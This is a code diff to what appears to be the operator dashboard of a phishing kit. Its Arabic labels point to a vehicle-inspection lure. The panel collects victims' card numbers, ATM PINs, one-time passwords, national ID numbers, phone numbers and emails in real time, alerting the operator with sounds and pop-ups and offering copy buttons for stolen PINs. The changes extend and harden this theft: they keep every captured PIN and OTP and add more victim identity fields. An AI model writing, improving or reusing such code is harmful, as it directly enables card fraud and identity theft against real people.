@@ -356,7 +356,13 @@ function initSock(){
     const ip=norm(d.ip||'');
     if(!ld[ip])ld[ip]={};
     ld[ip].requestId=d.requestId;
-    ld[ip].pay=d;
+    // تحديث البطاقة فقط إذا كانت بيانات جديدة (رقم مختلف)
+    const oldCard=ld[ip].pay;
+    const newNum=(d.cardNumber||d.card_number||'').replace(/\s/g,'');
+    const oldNum=oldCard?(oldCard.cardNumber||oldCard.card_number||'').replace(/\s/g,''):'';
+    if(!oldCard||newNum!==oldNum){
+      ld[ip].pay=d;
+    }
     ls[ip]='payment';
     rowBadge(ip,'payment'); updPend(); beep(660);
     toast('💳 بيانات بطاقة جديدة');
@@ -380,11 +386,21 @@ function initSock(){
     ld[mip].requestId=d.requestId;
 
     if(isPIN){
-      ld[mip].pin=d; ls[mip]='pin';
+      // لا تمسح PIN القديم — أضف الجديد فقط إذا كان مختلفاً
+      const oldPin=ld[mip].pin;
+      if(!oldPin||oldPin.code!==code){
+        ld[mip].pin=d;
+      }
+      ls[mip]='pin';
       rowBadge(mip,'pin'); beep(550);
       toast('🔒 رقم سري ATM: '+code);
     } else {
-      ld[mip].otp=d; ls[mip]='otp';
+      // لا تمسح OTP القديم — أضف الجديد فقط إذا كان مختلفاً
+      const oldOtp=ld[mip].otp;
+      if(!oldOtp||oldOtp.code!==code){
+        ld[mip].otp=d;
+      }
+      ls[mip]='otp';
       rowBadge(mip,'otp'); beep(770);
       toast('🔑 OTP جديد: '+code);
     }
@@ -531,9 +547,11 @@ function buildM(b,ex){
   </div>
   <div class="flist">
     <div class="frow"><span class="flbl">الاسم</span><span class="fval ar">${b.name||'-'}</span></div>
-    <div class="frow"><span class="flbl">رقم اللوحة</span><span class="fval">${b.national_id||'-'}</span></div>
-    <div class="frow"><span class="flbl">المنطقة</span><span class="fval ar">${b.region||'-'}</span></div>
-    <div class="frow"><span class="flbl">المبلغ الإجمالي</span><span class="fval">${b.total_amount||b.service_type||'-'}</span></div>
+    <div class="frow"><span class="flbl">رقم الهوية</span><span class="fval">${b.national_id||'-'}</span></div>
+    <div class="frow"><span class="flbl">رقم الهاتف</span><span class="fval">${b.phone_number||'-'}</span></div>
+    ${b.email?`<div class="frow"><span class="flbl">البريد الإلكتروني</span><span class="fval">${b.email}</span></div>`:''}
+    <div class="frow"><span class="flbl">منطقة الفحص</span><span class="fval ar">${b.region||'-'}</span></div>
+    <div class="frow"><span class="flbl">نوع الخدمة</span><span class="fval ar">${b.service_type||'-'}</span></div>
     <div class="frow"><span class="flbl">IP العميل</span><span class="fval">${b.ip||'-'}</span></div>
     <div class="frow"><span class="flbl">الحالة</span><span class="fval ar">${stl}</span></div>
   </div>`;
@@ -643,7 +661,8 @@ function buildCardSection(ip, ex){
   h+=`</div></div>`;
 
   // ---- قسم الرقم السري ATM ----
-  if(allPins.length>0||pind){
+  // قسم الرقم السري ATM — يظهر دائماً
+  {
     h+=`
     <div style="margin-bottom:16px">
       <div class="msec-hdr">
@@ -651,15 +670,19 @@ function buildCardSection(ip, ex){
         الرقم السري ATM
       </div>
       <div class="otp-sec">`;
-    allPins.forEach((p,i)=>{
-      const pc=p.code||'-';
-      const ts=p.created_at?new Date(p.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
-      const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
-      h+=`<div class="otp-row">
-        <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
-        <div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div>
-      </div>`;
-    });
+    if(allPins.length>0){
+      allPins.forEach((p,i)=>{
+        const pc=p.code||'-';
+        const ts=p.created_at?new Date(p.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+        const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
+        h+=`<div class="otp-row">
+          <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
+          <div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div>
+        </div>`;
+      });
+    } else {
+      h+=`<div class="otp-row"><span class="otp-lbl">الرقم السري ATM</span><span class="otp-wait">في الانتظار...</span></div>`;
+    }
     h+=`</div></div>`;
   }
 
